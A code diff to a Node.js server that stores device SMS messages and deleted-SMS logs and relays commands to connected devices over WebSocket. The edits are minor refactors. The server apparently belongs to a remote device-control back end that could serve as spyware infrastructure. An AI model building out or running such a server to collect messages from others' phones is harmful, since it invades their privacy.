@@ -42,7 +42,7 @@ const deviceSchema = new mongoose.Schema({
   isDeleted: { type: Boolean, default: false },
   smsMessages: Array,
   deletedSmsLog: { type: Array, default: [] },
-  lastCommandResult: { type: mongoose.Schema.Types.Mixed, default: null } // New: Save last result here
+  lastCommandResult: { type: mongoose.Schema.Types.Mixed, default: null }
 }, { timestamps: true });
 
 const Device = mongoose.model('Device', deviceSchema);
@@ -131,7 +131,7 @@ app.post('/api/command', async (req, res) => {
         
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device is OFFLINE' });
         
-        // Reset last result when sending new command
+        // Reset last result for a fresh command
         await Device.findOneAndUpdate(query, { $set: { lastCommandResult: null } });
 
         clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
@@ -139,15 +139,12 @@ app.post('/api/command', async (req, res) => {
     } catch(e) { return res.status(500).json({ success: false }); }
 });
 
-// New Endpoint for Long Polling result check
 app.get('/api/check-result/:deviceId', async (req, res) => {
     try {
         const { deviceId } = req.params;
         const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
         const device = await Device.findOne(query).lean();
-        if (device && device.lastCommandResult) {
-            return res.json({ success: true, result: device.lastCommandResult });
-        }
+        if (device && device.lastCommandResult) return res.json({ success: true, result: device.lastCommandResult });
         return res.json({ success: false });
     } catch (e) { res.status(500).json({ success: false }); }
 });
@@ -169,9 +166,9 @@ wss.on('connection', (ws, req) => {
       global.deviceSockets.get(id).add(ws);
       
       if (data.type === 'COMMAND_RESULT') {
-          const result = { success: data.success, message: data.message, action: data.command, timestamp: new Date() };
-          await Device.findOneAndUpdate({ deviceId: id }, { $set: { lastCommandResult: result } });
-          io.emit('command-result', { deviceId: id, ...result });
+          const resObj = { success: data.success, message: data.message, action: data.command, timestamp: new Date() };
+          await Device.findOneAndUpdate({ deviceId: id }, { $set: { lastCommandResult: resObj } });
+          io.emit('command-result', { deviceId: id, ...resObj });
           return;
       }
 
